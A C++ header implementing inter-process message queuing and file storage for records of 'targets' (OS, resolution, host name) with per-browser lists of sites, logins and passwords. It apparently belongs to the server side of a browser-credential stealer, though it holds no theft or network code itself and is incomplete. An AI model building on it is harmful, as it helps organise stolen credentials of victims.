#pragma once
#include <boost/interprocess/ipc/message_queue.hpp>
#include <queue>
#include "fileManager.hpp"

namespace InterProcess {
	namespace bipc = boost::interprocess;

	struct Data {             //Data storage for sending to another proccess
		Data() = default;
		Data(const Data& other) = delete;              //move only object
		Data& operator=(const Data& other) = delete;   //move only object		

		struct targetInfo { //all fields are required. Creates with the data object as a single copy
			std::string os;
			std::string resolution;
			std::string hostName;
		}_targetInfo; 

		struct BrowserData { //all fields are required
			std::string browserName;
			std::vector<std::tuple<std::string, std::string, std::string>>resources; //res.name - login - pass
		};

		std::vector<std::unique_ptr<BrowserData>>browsers; //vec with data of all browsers 

		std::string _targetId; //required field
	};

	class DataBuilder {
	public:
		explicit DataBuilder(const std::string& id) {
			this->resetDataP();
			this->resetBrowsP();
			p_data->_targetId = std::move(id); //sets up a current id
		}
		~DataBuilder() = default;

	private:
		std::unique_ptr<Data>p_data;
		std::unique_ptr<Data::BrowserData>p_browserData; //a part of Data struct
	
	public:
		void commitBrowserData() {    //pushs browserData into the vec of browsers after done of parsing
			p_data->browsers.push_back(getBrowsPtr());
		}
		template<typename...T>
		void buildTargetInfo(T&&...args) { //set up all target's info as os/resolution/host 
			p_data->_targetInfo = { args... }; //implicitly casts const char* to std::string
		}
		template<typename T>
		void addBrowserData(const std::optional<std::tuple<T,T,T>> &res = {},const std::optional<T> &name = {}) { //adds fields of the current BrowserData  
			bool hasRes = res.has_value();
			bool hasName = name.has_value();

			if (!hasRes && !hasName) {
				throw("Incomplete parameter");
			}
			if (hasRes) {
				p_browserData->resources.push_back(res.value());
			}
			if (hasName) p_browserData->browserName = name.value();
		}
		std::unique_ptr<Data> getDataPtr() { //returns current Data pointer
			auto current = p_data.release();
			this->resetDataP();
			return std::unique_ptr<Data>(current);
		}

	private:
		std::unique_ptr<Data::BrowserData> getBrowsPtr() { //calls on browser data commit.Creates new BrowserData pointer and returns previous 
			auto current = p_browserData.release();
			this->resetBrowsP();
			return std::unique_ptr<Data::BrowserData>(current);
		}	
		void resetDataP() noexcept { //resets Data pointer
			p_data.reset(new Data);
		}
		void resetBrowsP() noexcept { //resets BrowserData pointer
			p_browserData.reset(new Data::BrowserData);
		}
	};

	class IPCworkDispatcher: private FileManager{ //class that encapsulates and implements parallel message queue processing
	protected:                                    //private inheritance of fileManager to hide methods 
		IPCworkDispatcher() {
			p_worker = std::make_unique<std::thread>(std::bind(&IPCworkDispatcher::dataWaiter, this));
		}
		virtual ~IPCworkDispatcher() {
			this->stop(); //if not called, p_worker will be destroyed with the active thread;
			if (p_worker.get()->joinable()) {
				p_worker.get()->join();
			}
		} 
	public:
		static std::shared_ptr<IPCworkDispatcher> getInstance() {
			struct make_shared_enabler : public IPCworkDispatcher {};
			static std::shared_ptr<IPCworkDispatcher>_disp = std::make_shared<make_shared_enabler>();
			return _disp;
		}
		template<typename T>
		void setCallback(T fun) { //setter for IPC callback which will be executed on new message
			callback = fun;
		}

		void start() {
			if (p_worker.get()->joinable()) {
				p_worker.get()->detach();
			}
		}
		void enqueue(std::unique_ptr<Data>&&data) {       //this func will be called from multiple parser threads through the IPC.newData()
			std::lock_guard<std::mutex>dataLock(dataMt);  //2 PARSER THREADS PUTTS DATA IN QUEUE AND THEN 1 CURRENT WORKER GETTS IT
			dataQueue.push(std::move(data));
		}
	private:
		bool write() override {
			try {
				std::filesystem::path path(root); //user folder path
				path.concat(currentData->_targetId); 

				createDir(path); //creating user folder with targetId as name
				
				openTo(std::filesystem::path(path).concat("/info.txt")); //creating file with os info
				
				dataFile << "os:" << currentData->_targetInfo.os << "\n"
					<< "screen:" << currentData->_targetInfo.resolution << "\n"
					<< "host:" << currentData->_targetInfo.hostName << "\n";
				close();
			}
			catch (std::exception& e) {
				std::cout << e.what();
			}
			//iter throught the all browsers data //create their folders and write all info into it
			return true;
		}
		void dataWaiter() {     //{spinlocked} waiting for new data and then then calls the specific callback
			while (!stop_flag) {                
				if (!dataQueue.empty()) {
					std::unique_lock<std::mutex>ulk(dataMt);

					currentData.reset(dataQueue.front().release()); //free memory of processed data and own's current data ptr
					dataQueue.pop(); //drop data ptr after release

					ulk.unlock();

					this->write(); //write data to file

					callback(currentData->_targetId); //send data's id to other process
				}
			}
		}
		void stop() {
			stop_flag = true;
		}

	private:
		std::atomic_bool stop_flag = ATOMIC_VAR_INIT(false);
		std::unique_ptr<std::thread>p_worker; 

		std::mutex dataMt;
		std::queue<std::unique_ptr<Data>>dataQueue; //onws all data ptrs wich are created in server parser func

		std::unique_ptr<Data>currentData; //current processing data from dataWaiter

		std::function<void(const std::string)>callback;
	};

	class IPC {

	public:
		IPC() {
			wd = IPCworkDispatcher::getInstance();

			bipc::message_queue::remove("dataReady_q");
			msg_queue = std::make_unique<bipc::message_queue>(bipc::create_only, "dataReady_q",10, sizeof(std::string));
		}
		~IPC() = default;

		void _init() { //make able to perform ipc operations;
			wd->setCallback(std::bind(&IPC::notify, this, std::placeholders::_1));
			wd->start(); //execute worker thread
		}
		void newData(std::unique_ptr<Data>&&data) const { //no effect before _init() call
			wd->enqueue(std::move(data));
		}
	private:
		std::unique_ptr<bipc::message_queue>msg_queue;
		std::shared_ptr<IPCworkDispatcher>wd;
	private:
		void notify(const std::string& id) { //Executs from IPCworkDispatcher thread and sends target id to another process
			msg_queue->send(id.data(), id.size(), 0);
		}
	};
};